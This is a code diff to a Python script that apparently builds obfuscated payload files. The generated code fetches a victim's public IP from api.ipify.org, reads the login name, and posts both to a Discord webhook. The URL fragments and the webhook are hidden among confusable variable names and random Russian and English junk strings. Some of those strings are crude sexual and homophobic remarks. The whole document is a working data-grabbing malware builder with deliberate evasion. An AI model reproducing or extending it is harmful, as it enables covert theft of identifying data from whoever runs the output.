@@ -101,6 +101,10 @@ def vexcm():
         "im inside your walls.", "pass","vex", "              "]
         randombools = ["vex = True", "gay = False", "femorgay = True", 
         "funstuff = True", "compiler = True"]
+        russo = ["здравствуйте", "Украина", "остановить третью мировую войну",
+        "я думаю, что у меня есть чувства к человеку, использующему этот сценарий прямо сейчас",
+        "в моем классе есть русская девочка", "мне нравится русский язык, это интересно",
+        "хорошо, grammarly, мне не нужна твоя помощь", "упс, немного английского проскользнуло"]
 
         print("[2]: Writing File")
         newlog.write(f"""
@@ -111,25 +115,22 @@ def vexcm():
 #  Reach me on discord dex.lol#1337
 
 '''dex.lol#1377'''
-'''''';{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};''''''
-
-'''{random.choices(randomstrings)}''';import requests;'''{random.choices(randombools)}''';import dhooks;{random.choices(randomstrings)}
-
-'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht"
-'''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(randombools)};''''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';l6="{sechook[6]}";{random.choices(randomstrings)}
-'''{random.choices(randomstrings)}''';{random.choices(randomstrings)};{random.choices(randombools)};{random.choices(randombools)};'''dexIIIlIlIlllIllIIIIllIlIII'''
-'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";{random.choices(randombools)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(randomstrings)}'''
+'''''';{random.choices(russo)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};{random.choices(russo)};{random.choices(randombools)};{random.choices(russo)};''''''
+'''{random.choices(randomstrings)}''';import os;import requests;'''{random.choices(randombools)}''';import dhooks;{random.choices(randomstrings)}
+'''{random.choices(russo)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht";{random.choices(russo)}
+'''{random.choices(russo)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(randombools)};''''{random.choices(randomstrings)}'''
+'''{random.choices(russo)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(randomstrings)}''';l6="{sechook[6]}";{random.choices(randomstrings)}
+'''{random.choices(randomstrings)}''';{random.choices(russo)};{random.choices(randombools)};{random.choices(randombools)};'''dexIIIlIlIlllIllIIIIllIlIII'''
+'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";user=os.getlogin();{random.choices(randombools)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(russo)}'''
 '''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
-'''{random.choices(randomstrings)}''';l0="{sechook[0]+"//"}";{random.choices(randomstrings)};{random.choices(randombools)};l4="{sechook[4]+"/"}";'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)}
+'''{random.choices(russo)}''';l0="{sechook[0]+"//"}";{random.choices(randomstrings)};{random.choices(randombools)};l4="{sechook[4]+"/"}";'''{random.choices(russo)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(russo)}
 '''{random.choices(randomstrings)}''';{random.choices(randomstrings)};'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
-'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
-'''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';{random.choices(randombools)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
+'''{random.choices(randomstrings)} {random.choices(russo)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
+'''{random.choices(russo)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';{random.choices(russo)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
 '''{random.choices(randomstrings)} {random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send("{os.getlogin()}: "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
-
-'''''';{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};''''''
+'''{random.choices(russo)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send(user+": "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
+'''''';{random.choices(russo)};{random.choices(randomstrings)};{random.choices(russo)};{random.choices(russo)};{random.choices(russo)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(russo)};''''''
 '''dex.lol#1337'''
         """)
         print("[/]: File Compiled, sent to Compiled Folder")
